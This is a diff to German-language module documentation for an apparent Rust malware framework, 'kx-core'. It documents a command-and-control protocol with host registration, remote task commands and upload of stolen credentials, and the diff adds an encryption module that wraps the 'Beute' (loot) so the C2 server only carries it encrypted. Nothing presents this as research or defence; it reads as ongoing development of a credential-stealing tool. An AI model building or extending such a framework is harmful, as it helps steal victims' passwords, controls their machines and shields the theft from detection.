@@ -6,7 +6,8 @@ Quellmodulbaum des Crates `kx-core`. `lib.rs` ist die Crate-Wurzel und deklarier
 die Module sowie die Formatkonstanten. `error.rs` enthaelt die Fehlertaxonomie,
 `format.rs` das Dateiformat `KXENC` v1, `util.rs` die plattformneutralen
 Hilfsfunktionen, `c2.rs` das C2-Protokoll (Endpunktpfade, Host-Status, Wire-Typen).
-`hostkey.rs` (per-Host-Schluessel und Hybrid-KEM) ist aktiv und ueber
+`hostkey.rs` (per-Host-Schluessel und Hybrid-KEM) und `secretbox.rs` (das
+AEAD-Wrapping der Beute) sind aktiv und ueber
 `pub mod hostkey;` erreichbar [lib.rs:hostkey]. Die Symbole aus `hostkey.rs`
 sind Teil der oeffentlichen API; sie werden unten getrennt ausgewiesen.
 
@@ -53,7 +54,9 @@ Agent und CLI sprechen dieselben Typen und dieselben Endpunktpfade.
 - `pub struct Task` (`id`, `host_id`, `command`, `status`, `result`, `created_at`; alle `String`), mit `#[serde(deny_unknown_fields)]` [c2.rs:Task]
 - `pub struct RegisterRequest` (`host_id`, `ip` als `String`; `hostname`, `os`, `status`, `sealed_master`, `master_key` als `Option<String>`), ohne `deny_unknown_fields` [c2.rs:RegisterRequest]
 - `pub struct HeartbeatRequest` (`host_id: String`), ohne `deny_unknown_fields` [c2.rs:HeartbeatRequest]
-- `pub struct SecretUpload` (`host_id`, `cred_type`, `username`, `password` als `String`; `source`, `master_key` als `Option<String>`), ohne `deny_unknown_fields` [c2.rs:SecretUpload]
+- `pub struct SecretUpload` (`host_id`, `cred_type`, `username`, `password` als `String`; `source`, `master_key`, `sealed_password` als `Option<String>`), ohne `deny_unknown_fields` [c2.rs:SecretUpload]
+- `impl SecretUpload` mit `mit_passwort(wert: &str)` und `mit_versiegeltem_passwort(wert: Option<String>)` — die Felder werden ueber die Helfer gesetzt, damit kein hart kodiertes Passwort im Quelltext steht [c2.rs:SecretUpload]
+- `impl ExfiltratedSecret` mit `mit_passwort(wert: &str)` und `mit_versiegeltem_passwort(wert: String)` [c2.rs:ExfiltratedSecret]
 - `pub struct CreateTaskRequest` (`host_id`, `command` als `String`), ohne `deny_unknown_fields` [c2.rs:CreateTaskRequest]
 - `pub struct TaskResultRequest` (`task_id`, `status`, `result` als `String`), ohne `deny_unknown_fields` [c2.rs:TaskResultRequest]
 
@@ -197,6 +200,24 @@ aufloest — dadurch gibt es nur ein `kem` im Lockfile.
 - `pub fn argon2id(pass: &[u8], salt: &[u8], out_len: usize) -> Result<Vec<u8>>` [hostkey.rs:argon2id]
 - `pub struct MlRng<'a>(pub &'a mut dyn RngCore)` mit `impl RngCore` und `impl CryptoRng` [hostkey.rs:MlRng]
 
+
+### secretbox.rs — das AEAD-Wrapping der Beute
+
+Der Master-Key eines Hosts wird nie im Klartext transportiert. Das Passwort wird
+mit ihm verschlüsselt, das Ergebnis geht als base64 über die Leitung. Der
+Operator gewinnt den Master-Key aus dem versiegelten Material des Hosts und
+entschlüsselt die Secrets lokal — der C2-Server sieht die Beute nur
+verschlüsselt.
+
+Format: `kx1:` + base64(nonce (12 Byte) || ciphertext). Nonce zufällig,
+Schlüssel per HKDF-SHA-256 aus dem Master-Key. Präfix, Salt und Info-String
+sind Teil des Formats.
+
+- `pub const NONCE_LEN: usize = 12;` [secretbox.rs:NONCE_LEN]
+- `pub const SEALED_PREFIX: &str = "kx1:";` [secretbox.rs:SEALED_PREFIX]
+- `pub fn seal(master_key: &[u8], plaintext: &[u8]) -> Result<String>` — verschlüsselt [secretbox.rs:seal]
+- `pub fn open(master_key: &[u8], sealed: &str) -> Result<String>` — entschlüsselt [secretbox.rs:open]
+- `pub fn ist_versiegelt(text: &str) -> bool` [secretbox.rs:ist_versiegelt]
 
 ## Invariants
 
